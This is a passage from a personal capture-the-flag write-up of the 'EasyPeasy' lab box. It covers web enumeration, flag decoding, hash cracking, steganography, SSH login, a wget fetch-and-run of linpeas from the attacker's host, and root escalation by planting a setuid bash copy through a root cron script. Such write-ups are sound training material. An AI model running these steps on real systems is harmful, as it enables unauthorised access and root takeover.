+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 390]
+/whatever             (Status: 301) [Size: 169] [--&gt; http://10.201.72.248/hidden/whatever/]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+#Hidden in the page source was this -&gt; &lt;p hidden&gt;ZmxhZ3tmMXJzN19mbDRnfQ==&lt;/p&gt; and i extensively used cyberchef for this ctf and it gave me 
+#input: ZmxhZ3tmMXJzN19mbDRnfQ==                output: flag{f1rs7_fl4g} (From Base64)
+
+#Next i checked the other 65524/tcp open  http  apache site
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % gobuster dir -u http://10.201.72.248:65524/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.72.248:65524/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 281]
+/.htpasswd            (Status: 403) [Size: 281]
+/.hta                 (Status: 403) [Size: 281]
+/index.html           (Status: 200) [Size: 10818]
+/robots.txt           (Status: 200) [Size: 153]
+/server-status        (Status: 403) [Size: 281]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+#so two hits
+
+http://10.201.72.248:65524/robots.txt
+User-Agent:*
+Disallow:/
+Robots Not Allowed
+User-Agent:a18672860d0510e5ab6699730763b250
+Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+#This flag was pretty hard to crack actually. i didnt knew what this actually was. but at the end i tried my trusty https://md5hashing.net/
+
+Md5 hash
+calculated hash digest
+a18672860d0510e5ab6699730763b250
+
+Md5 value
+Reversed hash value
+flag{1m_s3c0nd_fl4g}
+
+#Yes, let&#39;s go!
+
+# Then in http://10.201.72.248:65524/ we got                            Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} and this bit of info
+#          Apache 2 It Works For Me
+#   &lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;
+#        &lt;/span&gt;
+
+#So, next on cybercheft i tried various base formats and got a hit with Base64 as ObsJmP173N2X6dOrAgEAL0Vu ---&gt; /n0th1ng3ls3m4tt3r
+#So, going to http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/ we get 
+
+&lt;center&gt;
+&lt;img src=&quot;binarycodepixabay.jpg&quot; width=&quot;140px&quot; height=&quot;140px&quot;/&gt;
+&lt;p&gt;940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81&lt;/p&gt;
+&lt;/center&gt;
+
+#We were given a downloadable password list and i tested this string against that and got the match
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % WORDLIST=/home/makar/CTFs/easypeasyctf/easypeasy_1596838725703.txt
+/home/makar/john-jumbo/run/john \
+  --format=gost \
+  --wordlist=&quot;$WORDLIST&quot; \
+  --rules \
+  hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
+Will run 8 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, &#39;h&#39; for help, almost any other key for status
+Enabling duplicate candidate password suppressor using 256 MiB
+mypasswordforthatjob (?)
+1g 0:00:00:00 DONE (2025-09-02 09:33) 4.167g/s 17066p/s 17066c/s 17066C/s vickvick..ramiley
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+
+#It was the encryption GOST that was very hard to get. i used the hint to specify the type of hashing algorithm used. Next i got that pic
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % wget http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+--2025-09-02 09:36:19--  http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+Connecting to 10.201.72.248:65524... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 90158 (88K) [image/jpeg]
+Saving to: ‘binarycodepixabay.jpg’
+
+binarycodepixabay.jpg                  100%[============================================================================&gt;]  88.04K  34.1KB/s    in 2.6s
+
+2025-09-02 09:36:22 (34.1 KB/s) - ‘binarycodepixabay.jpg’ saved [90158/90158]
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % steghide info binarycodepixabay.jpg
+&quot;binarycodepixabay.jpg&quot;:
+  format: jpeg
+  capacity: 4.6 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase:
+  embedded file &quot;secrettext.txt&quot;:
+    size: 278.0 Byte
+    encrypted: no
+    compressed: no
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ls
+10.201.72.248:65524/  binarycodepixabay.jpg  easypeasy_1596838725703.txt  easypeasyctf_nmap  hash.txt
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % steghide extract -sf binarycodepixabay.jpg
+Enter passphrase:
+wrote extracted data to &quot;secrettext.txt&quot;.
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ls
+10.201.72.248:65524/  binarycodepixabay.jpg  easypeasy_1596838725703.txt  easypeasyctf_nmap  hash.txt  secrettext.txt
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % cat secrettext.txt
+username:boring
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+
+#Using cyberchef we get this binary to spell iconvertedmypasswordtobinary which is our password for ssh!!!
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ssh -p 6498 boring@10.201.72.248 
+#(As ssh was at other port than its usual one)
+The authenticity of host &#39;[10.201.72.248]:6498 ([10.201.72.248]:6498)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[10.201.72.248]:6498&#39; (ED25519) to the list of known hosts.
+*************************************************************************
+**        This connection are monitored by government offical          **
+**            Please disconnect if you are not authorized              **
+** A lawsuit will be filed against you if the law is not followed      **
+*************************************************************************
+boring@10.201.72.248&#39;s password:
+You Have 1 Minute Before AC-130 Starts Firing
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+You Have 1 Minute Before AC-130 Starts Firing
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+boring@kral4-PC:~$ whoami
+boring
+boring@kral4-PC:~$ id; uname -a
+uid=1000(boring) gid=1000(boring) groups=1000(boring)
+Linux kral4-PC 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+boring@kral4-PC:~$ ls
+user.txt
+boring@kral4-PC:~$ cat user.txt
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a0jvgf33zfa0ez4y}
+#(Those are just scary welcome text, nothing to worry about)
+
+Using Rot13 we get synt{a0jvgf33zfa0ez4y} ---&gt; flag{n0wits33msn0rm4l}
+
+#
+
+boring@kral4-PC:~$ sudo -l
+[sudo] password for boring:
+Sorry, try again.
+[sudo] password for boring:
+Sorry, user boring may not run sudo on kral4-PC.
+boring@kral4-PC:~$ ls -la /home
+total 12
+drwxr-xr-x  3 root   root   4096 Jun 14  2020 .
+drwxr-xr-x 23 root   root   4096 Jun 15  2020 ..
+drwxr-xr-x  5 boring boring 4096 Jun 15  2020 boring
+boring@kral4-PC:/$ ls -la root
+ls: cannot open directory &#39;root&#39;: Permission denied
+boring@kral4-PC:/$ cd root
+-bash: cd: root: Permission denied
+#ok, i just got the linpeas.sh and ran it
+boring@kral4-PC:/tmp$ wget http://10.21.223.89:8000/linpeas.sh
+--2025-09-02 02:50:06--  http://10.21.223.89:8000/linpeas.sh
+Connecting to 10.21.223.89:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 956174 (934K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh         100%[================&gt;] 933.76K   180KB/s    in 5.2s
+
+2025-09-02 02:50:12 (180 KB/s) - ‘linpeas.sh’ saved [956174/956174]
+
+boring@kral4-PC:/tmp$ chmod +x linpeas.sh
+boring@kral4-PC:/tmp$ ./linpeas.sh
+
+#makar@LAPTOP-ASUME87D:~/pentest-tools  % python3 -m http.server 8000
+#Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+#10.201.72.248 - - [02/Sep/2025 09:50:07] &quot;GET /linpeas.sh HTTP/1.1&quot; 200 -
+
+#i don&#39;t know how but this grabbed my attention 
+╔══════════╣ Web files?(output limit)
+/var/www/:
+total 16K
+drwxr-xr-x  3 root   root   4.0K Jun 15  2020 .
+drwxr-xr-x 14 root   root   4.0K Jun 13  2020 ..
+drwxr-xr-x  4 root   root   4.0K Jun 15  2020 html
+-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
+
+/var/www/html:
+total 32K
+drwxr-xr-x 4 root root 4.0K Jun 15  2020 .
+#That .mysecretcronjob.sh felt important to me somehow among the huge output of linpeas. maybe i am builing a tiny bit of intution for this :)
+
+boring@kral4-PC:/tmp$ cd /var/www/
+boring@kral4-PC:/var/www$ ls
+html
+boring@kral4-PC:/var/www$ ls -la
+total 16
+drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
+drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
+drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
+-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
+boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh
+#!/bin/bash
+# i will run as root
+boring@kral4-PC:/var/www$ ./.mysecretcronjob.sh
+boring@kral4-PC:/var/www$ whoami
+boring
+boring@kral4-PC:/var/www$ sudo -l
+[sudo] password for boring:
+Sorry, user boring may not run sudo on kral4-PC.
+
+#Running this by myself wont work, it needs to be executed by the root i think. also there is nothing in the code that will get me to root. So,
+
+boring@kral4-PC:/var/www$ grep -R &quot;.mysecretcronjob.sh&quot; /etc/cron* 2&gt;/dev/null
+/etc/crontab:* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh
+boring@kral4-PC:/var/www$ cat /etc/crontab 2&gt;/dev/null | grep -i mysecret
+* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh
+boring@kral4-PC:/var/www$ systemctl status cron 2&gt;/dev/null | sed -n &#39;1,40p&#39;
+● cron.service - Regular background program processing daemon
+   Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
+   Active: active (running) since Tue 2025-09-02 01:15:42 PDT; 1h 43min ago
+     Docs: man:cron(8)
+ Main PID: 460 (cron)
+    Tasks: 1 (limit: 524)
+   CGroup: /system.slice/cron.service
+           └─460 /usr/sbin/cron -f
+
+Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.
+#Ok, it was definitely running every minute. because those * mean 
+# A &#39;*&#39; means “every value”. So * * * * * = every minute of every hour, every day, every month, every weekday.
+# Because this is /etc/crontab, there’s a user field (root) after the 5 time fields, so the command runs as root.
+
+boring@kral4-PC:/var/www$ nano .mysecretcronjob.sh
+
+#!/bin/bash                          # Shebang: run this script with Bash.
+# i will run as root                 # Just a Comment, won&#39;t run
+/bin/cp /bin/bash /tmp/bashroot      # Copies the bash binary to /tmp/bashroot
+/bin/chown root:root /tmp/bashroot   # Makes that copy owned by root
+/bin/chmod 4755 /tmp/bashroot        # Sets permissions to rwsr-xr-x (octal 4755)
+                                     4 in the leading position = setuid bit
+                                     7 = owner rwx
+                                     5 = group r-x
+                                     5 = others r-x
+#The setuid bit means: when any user runs /tmp/bashroot, the process runs with the effective UID of the file owner (root) → privilege escalation.
+
+boring@kral4-PC:/var/www$ ls -l /tmp/bashroot
+-rwsr-xr-x 1 root root 1113504 Sep  2 03:05 /tmp/bashroot
+boring@kral4-PC:/var/www$ /tmp/bashroot -p
+bashroot-4.4#
+
+#We are Root!!!!!!!!!
+
+bashroot-4.4# id
+uid=1000(boring) gid=1000(boring) euid=0(root) groups=1000(boring)
+bashroot-4.4# whoami
+root
+bashroot-4.4# cd /
+bashroot-4.4# cd root
+bashroot-4.4# ls -la
+total 40
+drwx------  5 root root 4096 Jun 15  2020 .
+drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
+-rw-------  1 root root  883 Jun 15  2020 .bash_history
+-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
+drwx------  2 root root 4096 Jun 13  2020 .cache
+drwx------  3 root root 4096 Jun 13  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
+-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
+bashroot-4.4# cat .root.txt
+flag{63a9f0ea7bb98050796b649e85481845}
+
+#Yesss! Let&#39;s GOooo.. Completed Fully!#
+</code></pre></div>
+
+
+
+</details>
+
+<hr />
+<h2 id="8-afteraction-review-aar">8) After‑Action Review (AAR)<a class="headerlink" href="#8-afteraction-review-aar" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>What worked first time?</strong> e.g., base64 recognition, robots.txt lead.</li>
+<li><strong>What wasted time?</strong> e.g., brute forcing without a clue; missed header.</li>
+<li><strong>1 change for next time:</strong> e.g., <em>always</em> run <code>exiftool</code> on any media.</li>
+<li><strong>Update your personal wordlists</strong> with themes you noticed here.</li>
+</ul>
+<hr />
+<h2 id="appendix-a-quick-theory-nuggets">Appendix A — Quick Theory Nuggets<a class="headerlink" href="#appendix-a-quick-theory-nuggets" title="Permanent link">&para;</a></h2>
+<h3 id="a1-setuid-in-one-minute">A.1 Setuid in One Minute<a class="headerlink" href="#a1-setuid-in-one-minute" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Files have <strong>mode bits</strong>: read(4), write(2), execute(1).  </li>
+<li>The special <strong>setuid bit (4xxx)</strong> on an executable sets <strong>effective UID</strong> to owner on exec.  </li>
+<li>With <code>root:root</code> owner, <code>chmod 4755 bash</code> → <code>bash -p</code> runs with eUID=0.</li>
+</ul>
+<h3 id="a2-why-sc-sv">A.2 Why <code>-sC -sV</code>?<a class="headerlink" href="#a2-why-sc-sv" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Default scripts quickly surface misconfigs without being intrusive.  </li>
+<li>Version detection lets you map to known vulns (CVE search) or framework‑specific tricks.</li>
+</ul>
+<hr />
+<h2 id="credits">Credits<a class="headerlink" href="#credits" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Box: <em>EasyPeasy</em> (web)  </li>
+<li>Author: Kareem  </li>
+<li>Toolkit: nmap, whatweb, gobuster, curl, exiftool, binwalk, strings, john/hashcat</li>
+</ul>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["search.suggest", "search.highlight", "content.code.copy", "navigation.instant", "navigation.top", "navigation.tabs"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+    
+  </body>
+</html>
